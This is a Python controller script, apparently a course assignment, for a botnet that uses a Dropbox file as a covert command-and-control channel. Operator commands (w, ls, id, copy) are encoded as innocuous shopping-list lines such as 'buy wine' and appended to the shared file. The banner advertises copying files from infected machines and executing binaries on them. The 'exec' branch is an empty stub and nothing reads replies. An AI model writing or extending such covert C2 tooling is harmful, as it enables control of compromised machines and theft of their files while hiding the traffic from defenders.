#
# Author: Adam Novak
#
# Plagiarism is a sin!
# Plagiarism is a sin!
# Plagiarism is a sin!
#

import sys
import time
from Connection import Connection


if __name__ == "__main__":

    # get args
    argc = len(sys.argv)
    argv = sys.argv

    # check number of arguments
    if argc != 3:
        exit("python3 controller.py <API KEY> <INTERVAL>")

    # programmer friendly naming
    api_key = argv[1]
    interval = int(argv[2])
    shopping_list = "/shopping_list.txt"

    # create connection
    conn = Connection(api_key)

    # check connection
    if not conn.is_connected():
        exit("Could not to connect to Dropbox!")

    # create clear shopping list
    if not conn.create_file(shopping_list):
        exit("Could not create shopping list!")

    # introduction
    print("   ___     ___   __   __")
    print("  | _ )   / __|  \ \ / /")
    print("  | _ \   \__ \   \ V / ")
    print("  |___/   |___/    |_|  ")
    print("")
    print("Supported commands:")
    print("w               list of users currently logged in")
    print("ls <PATH>       list content of specified directory")
    print("id              ID of current user")
    print("copy <PATH>     copy a file from the bot to the controller")
    print("exec <PATH>     execute a binary inside the bot given the path of the binary")
    print("")

    # counter for commands
    counter = 0

    # period heartbeat
    last_heartbeat = 0

    # send commands
    while True:

        current_time = int(time.time())

        # read command
        command = input("What is you command: ").split()
        counter += 1
        encrypted_command = "\n"

        # command w
        if len(command) == 1 and command[0] == "w":
            encrypted_command = "on " + str(counter) + " day buy wine\n"
        # command ls
        elif len(command) == 2 and command[0] == "ls":
            encrypted_command = "on " + str(counter) + " day buy list\n"
        # command id
        elif len(command) == 1 and command[0] == "id":
            encrypted_command = "on " + str(counter) + " day buy identity\n"
        # command copy
        elif len(command) == 2 and command[0] == "copy":
            encrypted_command = "on " + str(counter) + " day buy copy machine\n"
        # command w
        elif len(command) == 2 and command[0] == "exec":
            pass
        # unknown
        else:
            print("Unknown command. Try it again.\n")
            continue

        # try to send command
        if not conn.append_to_file(shopping_list, encrypted_command):
            print("Could not write command. Try it again.\n")
            continue

        print("command sent!")




